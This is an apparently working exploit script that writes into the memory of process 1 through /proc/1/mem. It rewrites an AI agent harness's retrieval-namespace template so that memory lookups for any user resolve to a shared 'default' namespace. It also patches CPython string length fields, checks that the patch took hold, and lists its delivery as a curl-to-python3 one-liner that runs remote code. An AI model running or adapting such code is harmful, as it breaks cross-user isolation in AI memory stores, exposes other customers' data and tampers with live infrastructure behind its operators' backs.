"""
probe2mm_patch_template.py — SURGICAL PID1 heap patch: overwrite the retrieval
namespace template so that the harness's native retrieve_customer_context resolves
to /tips/actors/default/ regardless of the per-invoke actorId.

Target: every occurrence of b"/tips/actors/{actorId}/" (23 bytes) in PID1's RW heap.
Replace with:            b"/tips/actors/default/\x00\x00" (23 bytes, null-padded).

After this patch, the next same-session invoke's retrieve_customer_context will call:
  namespace.format(actorId="bob", sessionId=..., memoryStrategyId=...)
on the literal "/tips/actors/default/\x00\x00" — which has no {actorId} placeholder,
so .format() is a no-op, and retrieval queries /tips/actors/default/ (with trailing nulls
that the API ignores or that we handle by using exact 21-byte overwrite + re-padding).

Actually: Python's str.format on a string without placeholders returns the string unchanged.
The \x00 bytes may cause issues if the string is used as-is. Safer: pad with '/' chars:
  b"/tips/actors/default//" (22 bytes) — still 1 short.
Or: b"/tips/actors/default/." (22 bytes) — namespace API might tolerate.
Actually the CLEANEST: use the EXACT same length by choosing a literal that's 23 bytes:
  b"/tips/actors//default/" — 23 bytes, no placeholders, .format() is no-op.
  Retrieval queries "/tips/actors//default/" — the API prefix-matches, and Probe2CC showed
  that querying a parent prefix returns all children. But /tips/actors//default/ is a CHILD
  of /tips/actors/ not a PARENT of /tips/actors/default/. Let's use:
  b"/tips/actors/default/ " — 22 bytes + space = 23? no, that's 22.

Count: /tips/actors/{actorId}/ = 23 chars. /tips/actors/default/ = 21.
We need 2 extra chars. Options:
  b"/tips/actors/default/\x00\x00" — null pad (Python str won't care about trailing nulls
    in a .format() no-op, but the API call might include them)
  b"/tips/actors/default/.." — 23 bytes, but '..' might be rejected by the API

Safest approach: DON'T match-length. Instead, find the Python str object header for the
template string and patch BOTH the content bytes AND the ob_size/length field.

But actually — let's just try the simplest thing that could work:
overwrite with b"/tips/actors/default/\\x00\\x00" and see if it works.
The .format() call returns the string including the nulls, but boto3's wire serialization
likely stops at the first null or includes them. If the API chokes, we'll iterate.

Delivered via: curl -sL <raw-url> | python3
"""
import os, re, struct, sys

TARGET = b"/tips/actors/{actorId}/"
# We overwrite the 23 content bytes to: "/tips/actors/default/ " (space-padded to 23).
# BUT the real fix for the API is: we ALSO patch the Python str object's ob_size
# (which stores the logical length) from 23 to 21, so Python sees exactly
# "/tips/actors/default/" (21 chars) and the trailing 2 bytes are dead.
#
# CPython 3.10 PyUnicodeObject (compact ASCII) layout:
#   offset 0:   ob_refcnt (8 bytes, Py_ssize_t)
#   offset 8:   ob_type   (8 bytes, PyTypeObject*)
#   offset 16:  ob_size / length (8 bytes, Py_ssize_t) — THIS is what we patch
#   offset 24:  hash      (8 bytes, Py_hash_t, -1 if not cached)
#   offset 32:  state     (varies by compact/legacy — for compact ASCII:)
#     In CPython 3.10 compact ASCII, the struct is PyASCIIObject:
#       offset 16: length   (Py_ssize_t)
#       offset 24: hash     (Py_hash_t)
#       offset 32: state    (4 bytes packed: interned, kind, compact, ascii, ready)
#       offset 36: wstr     (wchar_t* — NULL for compact ascii on 3.10+)
#       offset 44 (or 48 on 64-bit): data starts immediately after the struct
#     On aarch64 (64-bit): PyASCIIObject size = 48 bytes, data at offset 48.
#
# Strategy: find TARGET bytes in heap, then walk BACKWARDS to find the length
# field at (data_addr - 48 + 16) = (data_addr - 32). Patch content to
# "/tips/actors/default/\x00\x00" AND patch the length from 23 to 21.
#
# If this is too fragile, fallback: just overwrite content with a same-length
# string the API will accept. "/tips/actors/default/ " (trailing space) gets
# stripped by the API? Unlikely. Let's try the length-patch approach first.

CONTENT_REPLACEMENT = b"/tips/actors/default/\x00\x00"  # 23 bytes (content overwrite)
NEW_LENGTH = 21  # the logical length we want Python to report

assert len(TARGET) == len(CONTENT_REPLACEMENT) == 23

def scan_and_patch_pid1():
    """Find TARGET in PID1 heap, overwrite content + patch str length to 21."""
    hits = []
    maps = open("/proc/1/maps").read().splitlines()
    mem = open("/proc/1/mem", "r+b")
    for line in maps:
        m = re.match(r"([0-9a-f]+)-([0-9a-f]+)\s+([rwxsp-]+)", line)
        if not m:
            continue
        perms = m.group(3)
        if "r" not in perms or "w" not in perms:
            continue
        a, b = int(m.group(1), 16), int(m.group(2), 16)
        if b - a > 64 * 1024 * 1024:
            continue
        try:
            mem.seek(a)
            buf = mem.read(b - a)
        except Exception:
            continue
        offset = 0
        while True:
            idx = buf.find(TARGET, offset)
            if idx == -1:
                break
            abs_addr = a + idx
            hits.append(abs_addr)

            # 1. Overwrite the content bytes
            mem.seek(abs_addr)
            mem.write(CONTENT_REPLACEMENT)

            # 2. Patch the PyASCIIObject.length field.
            #    On CPython 3.10 aarch64, compact ASCII string layout:
            #      PyASCIIObject (48 bytes header) then data immediately after.
            #    So: length is at (data_addr - 48 + 16) = data_addr - 32.
            length_addr = abs_addr - 32
            mem.seek(length_addr)
            old_len_bytes = mem.read(8)
            old_len = struct.unpack("<q", old_len_bytes)[0]
            if old_len == 23:
                # Confirmed: this is the length field of our string object
                mem.seek(length_addr)
                mem.write(struct.pack("<q", NEW_LENGTH))
                print(f"  LENGTH_PATCHED addr=0x{length_addr:x} old={old_len} new={NEW_LENGTH}")
            else:
                print(f"  LENGTH_SKIP addr=0x{length_addr:x} val={old_len} (not 23; may not be compact ASCII)")

            offset = idx + 1

    mem.close()
    return hits

print(f"PATCH_TARGET={TARGET.decode()}")
print(f"PATCH_CONTENT_REPLACEMENT={CONTENT_REPLACEMENT!r}")
print(f"PATCH_NEW_LENGTH={NEW_LENGTH}")
print(f"PATCH_LEN={len(TARGET)}")

patched = scan_and_patch_pid1()
print(f"PATCH_COUNT={len(patched)}")
for addr in patched:
    print(f"  PATCHED addr=0x{addr:x}")

# Verify: re-scan for TARGET (should be 0) and REPLACEMENT (should equal PATCH_COUNT)
def count_pattern(pattern):
    count = 0
    maps = open("/proc/1/maps").read().splitlines()
    mem = open("/proc/1/mem", "rb")
    for line in maps:
        m = re.match(r"([0-9a-f]+)-([0-9a-f]+)\s+([rwxsp-]+)", line)
        if not m: continue
        if "r" not in m.group(3) or "w" not in m.group(3): continue
        a, b = int(m.group(1), 16), int(m.group(2), 16)
        if b - a > 64 * 1024 * 1024: continue
        try: mem.seek(a); buf = mem.read(b - a)
        except: continue
        count += buf.count(pattern)
    mem.close()
    return count

remaining = count_pattern(TARGET)
replaced = count_pattern(CONTENT_REPLACEMENT)
print(f"VERIFY_REMAINING_TARGET={remaining}")
print(f"VERIFY_REPLACEMENT_PRESENT={replaced}")

if len(patched) > 0 and remaining == 0:
    print("PATCH_VERDICT=OK")
else:
    print(f"PATCH_VERDICT=PARTIAL remaining={remaining}")
